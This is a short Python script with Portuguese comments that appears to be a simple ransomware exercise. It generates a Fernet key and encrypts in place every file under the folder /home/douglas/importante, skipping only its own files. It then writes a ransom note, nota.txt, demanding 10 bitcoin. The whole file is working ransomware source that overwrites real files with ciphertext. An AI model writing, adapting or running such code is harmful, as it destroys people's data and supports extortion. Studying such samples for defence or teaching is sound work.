from cryptography.fernet import Fernet
import os

# Gera a chave e salva em um arquivo
key = Fernet.generate_key()
with open ("chave.key", "wb") as key_file:
    key_file.write(key)

cipher = Fernet(key)

# Define a pasta alvo
pasta_alvo = "/home/douglas/importante"
# Percorre todos os arquivos dentro da pasta
for root, dirs, files in os.walk(pasta_alvo):
    for nome_arquivo in files:
        caminho_arquivo = os.path.join(root, nome_arquivo)
        
        # Ignora o proprio script, chave e nota
        if nome_arquivo in ["encrypt.py", "chave.key", "nota.txt", "decrypt.py"]:
            continue

        # Le, criptografa e salva o arquivo
        with open(caminho_arquivo, "rb") as file:
            conteudo = file.read()
        conteudo_encriptado = cipher.encrypt(conteudo)
        with open(caminho_arquivo, "wb") as file:
            file.write(conteudo_encriptado)

# Cria a nota de resgate
with open("nota.txt", "w") as nota:
    nota.write("Seus arquivos foram criptografados!\n")
    nota.write("Para recuperar, vai ter que me pagar 10 bitcoin!" )

print("Arquivos criptografados com sucesso.")

